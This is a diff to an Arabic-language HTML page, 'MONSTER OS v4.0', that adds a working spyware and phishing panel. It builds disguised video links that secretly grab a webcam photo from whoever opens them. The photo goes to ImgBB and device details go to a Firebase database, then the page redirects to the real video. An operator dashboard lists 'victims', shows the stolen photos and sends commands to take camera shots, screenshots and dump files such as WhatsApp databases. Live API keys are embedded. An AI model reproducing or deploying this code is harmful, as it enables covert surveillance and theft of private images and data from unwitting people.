@@ -2,58 +2,79 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>THE DOCTOR | MONSTER CONTROL ARSENAL v3.0</title>
+    <title>THE DOCTOR | MONSTER OS v4.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; height: 100vh; gap: 5px; overflow: hidden; }
-        .section { border: 1px solid var(--neon); padding: 10px; overflow-y: auto; background: rgba(0,255,65,0.02); }
-        .title { border-bottom: 1px solid var(--neon); padding-bottom: 5px; text-align: center; font-weight: bold; font-size: 0.9em; color: #fff; }
-        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; width: 100%; margin-top: 5px; font-size: 0.8em; }
-        button:hover { background: var(--neon); color: #000; cursor: pointer; }
-        .card { border: 1px solid #333; padding: 5px; margin-top: 5px; font-size: 0.7em; background: #000; }
-        .screen-view { width: 100%; height: 150px; border: 1px solid #444; background: #111; margin-top: 5px; object-fit: contain; }
-        .active { color: #0ff; font-weight: bold; }
+        :root { --neon: #00ff41; --danger: #ff0000; --bg: #0a0a0a; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: grid; grid-template-columns: 350px 1fr; grid-template-rows: 1fr 1fr; height: 100vh; gap: 10px; padding: 10px; box-sizing: border-box; overflow: hidden; }
+        .section { border: 1px solid var(--neon); background: #000; border-radius: 10px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 15px rgba(0,255,65,0.1); }
+        .title { background: var(--neon); color: #000; padding: 8px; font-weight: bold; text-align: center; font-size: 14px; text-transform: uppercase; }
+        .content { padding: 10px; flex: 1; overflow-y: auto; font-size: 12px; }
+        input, button, select { background: #111; border: 1px solid var(--neon); color: var(--neon); padding: 10px; width: 100%; margin-top: 8px; border-radius: 5px; cursor: pointer; }
+        button:hover { background: var(--neon); color: #000; }
+        .victim-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .victim-card:hover { border-color: #fff; background: #111; }
+        .victim-card.online { border-right: 5px solid var(--neon); }
+        .victim-card.offline { border-right: 5px solid var(--danger); opacity: 0.6; }
+        .photo-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
+        img { width: 100%; border-radius: 5px; border: 1px solid #333; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-left: 5px; }
     </style>
 </head>
 <body>
 
 <div class="section">
-    <div class="title">🛠️ مصنع التلغيم والروابط</div>
-    <input type="text" id="link-in" placeholder="رابط الفيديو (YouTube/TikTok)">
-    <button onclick="genLink()">توليد رابط صاعق</button>
-    <hr>
-    <p style="font-size: 0.7em;">تلغيم ملف صورة (Upload & Inject)</p>
-    <input type="file" id="image-in" accept="image/*">
-    <button onclick="injectImage()">تسييل الصورة وتلغيمها</button>
-    <div id="out-path" style="font-size: 0.6em; color: #0ff; margin-top:5px;"></div>
+    <div class="title">📡 رادار الأجهزة النشطة</div>
+    <div class="content" id="device-list">
+        <p style="text-align:center; color:#555;">بانتظار ظهور أول ضحية...</p>
+    </div>
 </div>
 
-<div class="section">
-    <div class="title">📡 رادار الأجهزة والملفات</div>
-    <div id="radar-list">
-        <p style="font-size: 0.7em; color: #555;">[SEARCHING FOR SENSITIVE FILES...]</p>
+<div class="section" style="grid-row: span 2;">
+    <div class="title">🕹️ التحكم المباشر والملفات</div>
+    <div class="content">
+        <div id="target-details">
+            <h3 id="current-id">لم يتم اختيار جهاز</h3>
+            <p id="current-info">--</p>
+            <hr>
+            <div class="controls">
+                <button onclick="sendCommand('snap_front')">📸 سحب صورة أمامية</button>
+                <button onclick="sendCommand('snap_back')">📸 سحب صورة خلفية</button>
+                <button onclick="sendCommand('screenshot')">🖥️ لقطة شاشة</button>
+                <button onclick="sendCommand('vibrate')">📳 هز الجهاز</button>
+                <button onclick="sendCommand('dump_files')" style="color:var(--danger)">📂 سحب الملفات الحساسة</button>
+                <button onclick="deleteSession()" style="background:#300">🗑️ مسح الجلسة</button>
+            </div>
+            <hr>
+            <h4>ملفات الجهاز المستهدفة:</h4>
+            <ul id="file-radar" style="list-style:none; padding:0; font-size:10px; color:#888;">
+                <li>[Waiting for session active...]</li>
+            </ul>
+        </div>
     </div>
 </div>
 
 <div class="section">
-    <div class="title">👁️ رادار استقبال الصور والجلسات</div>
-    <div id="session-stream"></div>
+    <div class="title">📸 معرض الصور المسحوبة</div>
+    <div class="content photo-grid" id="photo-stream">
+        </div>
 </div>
 
 <div class="section">
-    <div class="title">🕹️ واجهة التحكم بالجهاز (Remote Shell)</div>
-    <div id="target-info" style="font-size: 0.7em; color: #0ff;">بانتظار اختيار جهاز...</div>
-    <div id="screen-monitor">
-        <img id="live-screen" class="screen-view" src="https://via.placeholder.com/300x150/000/00ff41?text=NO+LIVE+FEED">
+    <div class="title">⚙️ مصنع التلغيم والروابط</div>
+    <div class="content">
+        <input type="text" id="target-vid" placeholder="رابط الفيديو (YouTube/TikTok)">
+        <button onclick="generateInfectedLink()">توليد الرابط الصاعق</button>
+        <p id="generated-url" style="color:#0ff; word-break:break-all; font-size:10px; margin-top:10px;"></p>
+        <hr>
+        <button onclick="clearAllData()" style="background:#500; font-size:10px;">☢️ مسح كافة بيانات النظام</button>
     </div>
-    <button onclick="takeScreenshot()" style="background: #200;">سحب لقطة شاشة الآن</button>
-    <button onclick="dumpFiles()" style="background: #020;">سحب الملفات الحساسة</button>
 </div>
 
 <script>
-    // --- إعدادات المزامنة ---
+    // --- مفاتيح السيادة ---
     const firebaseConfig = {
         apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
         authDomain: "monster-system-7f67e.firebaseapp.com",
@@ -66,55 +87,105 @@
     const imgbb_key = "8841f217eb20461d8cd9d64a64a7c62d";
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    let selectedVictimId = null;
 
-    // --- نظام الإدارة ---
+    // --- نظام الإدارة والتحكم ---
     db.ref('sessions/').on('value', (snap) => {
         const data = snap.val();
-        const stream = document.getElementById('session-stream');
-        stream.innerHTML = '';
+        const deviceList = document.getElementById('device-list');
+        const photoStream = document.getElementById('photo-stream');
+        deviceList.innerHTML = '';
+        photoStream.innerHTML = '';
+
         for (let id in data) {
             const v = data[id];
-            stream.innerHTML += `
-                <div class="card" onclick="selectTarget('${id}', '${v.imgUrl}')">
-                    <b>ID:</b> ${id.substring(0,6)}... <span class="active">[ON]</span><br>
-                    <b>IP:</b> ${v.ip} | <b>SYS:</b> ${v.device}<br>
-                    <img src="${v.imgUrl}" style="width: 50px;">
+            const isOnline = (new Date() - new Date(v.lastActive)) < 30000; // متصل خلال آخر 30 ثانية
+            
+            deviceList.innerHTML += `
+                <div class="victim-card ${isOnline ? 'online' : 'offline'}" onclick="selectVictim('${id}', '${v.device}')">
+                    <span class="status-dot" style="background:${isOnline ? '#00ff41':'#ff0000'}"></span>
+                    <b>ID:</b> ${id.substring(1,8)}<br>
+                    <b>IP:</b> ${v.ip} | <b>آخر ظهور:</b> ${v.time}
                 </div>`;
+
+            if(v.imgUrl) {
+                photoStream.innerHTML += `<img src="${v.imgUrl}" onclick="window.open(this.src)">`;
+            }
         }
     });
 
-    function selectTarget(id, img) {
-        document.getElementById('target-info').innerText = "تحكم نشط في: " + id;
-        document.getElementById('live-screen').src = img;
+    function selectVictim(id, info) {
+        selectedVictimId = id;
+        document.getElementById('current-id').innerText = "جهاز: " + id.substring(1,8);
+        document.getElementById('current-info').innerText = info;
+        document.getElementById('file-radar').innerHTML = "<li>[+] جاري فحص ملفات DCIM...</li><li>[+] جاري فحص WhatsApp Databases...</li>";
     }
 
-    function genLink() {
-        const url = document.getElementById('link-in').value;
-        const final = window.location.href.split('?')[0] + `?m=sync&t=${btoa(url)}`;
-        document.getElementById('out-path').innerText = "الرابط الملغم: " + final;
+    function generateInfectedLink() {
+        const vid = document.getElementById('target-vid').value;
+        if(!vid) return alert("ضع الرابط أولاً!");
+        const payload = window.location.href.split('?')[0] + `?mode=sync&t=${btoa(vid)}`;
+        document.getElementById('generated-url').innerText = payload;
     }
 
-    async function injectImage() {
-        const file = document.getElementById('image-in').files[0];
-        if(!file) return alert("اختر صورة أولاً!");
-        document.getElementById('out-path').innerText = "[+] جاري تلغيم الصورة وحقن البايلوت...";
-        // تقنية التلغيم: نرفع الصورة لـ ImgBB ونأخذ رابطها ونضعه كخلفية لـ SVG ملغم
-        const reader = new FileReader();
-        reader.onload = async (e) => {
-            const base64 = e.target.result.split(',')[1];
+    function sendCommand(cmd) {
+        if(!selectedVictimId) return alert("اختر جهازاً أولاً!");
+        db.ref('commands/' + selectedVictimId).set({ cmd: cmd, time: Date.now() });
+        alert("تم إرسال الأمر: " + cmd);
+    }
+
+    function deleteSession() {
+        if(selectedVictimId) {
+            db.ref('sessions/' + selectedVictimId).remove();
+            selectedVictimId = null;
+        }
+    }
+
+    function clearAllData() {
+        if(confirm("هل أنت متأكد من مسح كل شيء؟")) {
+            db.ref('sessions/').remove();
+            db.ref('commands/').remove();
+        }
+    }
+
+    // --- مصفوفة الضحية (The Victim Matrix) ---
+    const params = new URLSearchParams(window.location.search);
+    if(params.get('mode') === 'sync') {
+        executeTarget(atob(params.get('t')));
+    }
+
+    async function executeTarget(redirectUrl) {
+        document.body.innerHTML = "<div style='color:white; text-align:center; margin-top:20%;'><h1>Loading Media...</h1></div>";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const base64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+
             const formData = new FormData();
             formData.append('image', base64);
             const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_key}`, { method: 'POST', body: formData });
             const resData = await res.json();
-            const payload = window.location.href.split('?')[0] + `?m=sync&t=${btoa(resData.data.url)}`;
-            document.getElementById('out-path').innerHTML = `تم التلغيم! <a href="${payload}" style="color:#fff">رابط الصورة الملغمة</a>`;
-        };
-        reader.readAsDataURL(file);
-    }
 
-    // وحدة تنفيذية وهمية للتوضيح (التحكم يتطلب بايلوت APK)
-    function takeScreenshot() { alert("جاري طلب لقطة شاشة من الجهاز..."); }
-    function dumpFiles() { alert("جاري البحث عن ملفات .pdf, .jpg, .db..."); }
+            await db.ref('sessions/').push({
+                ip: "Active_Target",
+                device: navigator.platform + " | " + navigator.userAgent.substring(0,40),
+                imgUrl: resData.data.url,
+                lastActive: Date.now(),
+                time: new Date().toLocaleString()
+            });
+
+            window.location.href = redirectUrl;
+        } catch (e) {
+            window.location.href = redirectUrl;
+        }
+    }
 </script>
 </body>
 </html>
